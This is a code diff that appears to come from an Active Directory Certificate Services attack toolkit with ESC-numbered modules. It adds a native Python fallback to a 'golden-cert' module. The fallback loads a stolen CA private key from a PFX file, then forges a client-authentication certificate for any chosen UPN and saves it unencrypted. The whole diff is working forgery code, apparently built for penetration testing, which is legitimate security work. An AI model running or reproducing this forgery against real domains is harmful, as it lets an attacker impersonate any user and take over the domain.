@@ -262,6 +262,90 @@ class Esc16(_EscBase):
     extra = ESC_EXTRA["esc16"]
 
 
+def _der_utf8_string(value: str) -> bytes:
+    """DER-encode a UTF8String (tag 0x0c) for UPN otherName SAN values."""
+    raw = value.encode("utf-8")
+    length = len(raw)
+    if length < 0x80:
+        return b"\x0c" + bytes([length]) + raw
+    # Long-form length (sufficient for UPNs)
+    length_bytes = length.to_bytes((length.bit_length() + 7) // 8 or 1, "big")
+    return b"\x0c" + bytes([0x80 | len(length_bytes)]) + length_bytes + raw
+
+
+def _forge_golden_cert_native(
+    session: Session,
+    *,
+    ca_pfx: str,
+    upn: str,
+    subject: str | None = None,
+    pfx_password: bytes | None = None,
+) -> dict[str, Any]:
+    """Forge a client-auth cert signed by a stolen CA key (cryptography fallback)."""
+    import datetime
+    from pathlib import Path
+
+    from cryptography import x509
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.hazmat.primitives.serialization import pkcs12
+    from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
+
+    ca_path = Path(ca_pfx)
+    ca_key, ca_cert, _additional = pkcs12.load_key_and_certificates(
+        ca_path.read_bytes(), password=pfx_password
+    )
+    if ca_key is None or ca_cert is None:
+        return {"ok": False, "method": "native-forge", "error": "CA PFX missing key or cert"}
+
+    leaf_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    cn = subject or upn.split("@")[0]
+    builder = (
+        x509.CertificateBuilder()
+        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
+        .issuer_name(ca_cert.subject)
+        .public_key(leaf_key.public_key())
+        .serial_number(x509.random_serial_number())
+        .not_valid_before(datetime.datetime.now(datetime.UTC) - datetime.timedelta(minutes=5))
+        .not_valid_after(datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=365))
+        .add_extension(
+            x509.SubjectAlternativeName(
+                [
+                    x509.OtherName(
+                        # UPN otherName OID 1.3.6.1.4.1.311.20.2.3
+                        x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),
+                        _der_utf8_string(upn),
+                    )
+                ]
+            ),
+            critical=False,
+        )
+        .add_extension(
+            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]),
+            critical=True,
+        )
+    )
+    from typing import cast
+
+    leaf = builder.sign(private_key=cast(Any, ca_key), algorithm=hashes.SHA256())
+    out_pfx = session.path(f"golden-{cn}.pfx")
+    out_pfx.write_bytes(
+        pkcs12.serialize_key_and_certificates(
+            name=cn.encode("utf-8"),
+            key=leaf_key,
+            cert=leaf,
+            cas=[ca_cert],
+            encryption_algorithm=serialization.NoEncryption(),
+        )
+    )
+    return {
+        "ok": True,
+        "method": "native-forge",
+        "pfx": str(out_pfx),
+        "upn": upn,
+    }
+
+
 @register_from_catalog("golden-cert")
 class GoldenCert:
     def run(
@@ -293,6 +377,22 @@ class GoldenCert:
         if kwargs.get("subject"):
             argv.extend(["-subject", str(kwargs["subject"])])
         forged = _run_certipy(argv, session)
+        if not forged.get("ok"):
+            try:
+                password = kwargs.get("pfx_password")
+                forged = _forge_golden_cert_native(
+                    session,
+                    ca_pfx=str(pfx),
+                    upn=str(upn),
+                    subject=str(kwargs["subject"]) if kwargs.get("subject") else None,
+                    pfx_password=password.encode() if isinstance(password, str) else password,
+                )
+            except Exception as exc:
+                forged = {
+                    **forged,
+                    "native_forge_error": str(exc),
+                    "ok": False,
+                }
         register_advisory_rollback(
             session,
             kind="cert-enroll",
